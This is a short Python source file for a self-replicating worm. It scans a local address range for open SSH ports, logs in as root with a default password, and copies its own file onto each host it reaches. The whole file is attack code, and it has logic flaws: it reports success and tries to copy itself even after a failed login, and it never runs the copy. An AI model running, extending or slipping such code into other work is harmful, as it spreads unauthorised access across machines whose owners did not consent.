import paramiko
import socket

class Worm:
    def __init__(self, ip_range):
        self.ip_range = ip_range

    def start(self):
        ips = self.generate_ips()
        self.scan(ips)

    def generate_ips(self):
        result = []
        for i in range(1,11):
            temp = self.ip_range
            temp += str(i)
            result.append(temp)

        return result

    def scan(self, ips):
        for ip in ips:
            if self.is_running(ip):
                self.attack(ip)

    def is_running(self, ip):
        s = socket.socket()
        s.settimeout(0.5)
        try:
            print('Trying to connect to {}:22'.format(ip))
            s.connect((ip, 22))
        except:
            print('Failed...')
            return 0
        return 1

    def attack(self, ip):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(ip, username='root', password='toor')
        except paramiko.AuthenticationException:
            print('Failed to ssh to root@{}'.format(ip))

        print('Successfully ssh to root@{}'.format(ip))
        self.replicate(ssh)

    def replicate(self, connection):
        sftp_client = connection.open_sftp()
        try:
            sftp_client.stat('./tmp/worm.py')
            print('This server has already been infectd...')
        except IOError:
            sftp_client.put('worm.py', './tmp/worm.py')



if __name__ == '__main__':
    worm = Worm('192.168.2.')
    worm.start()
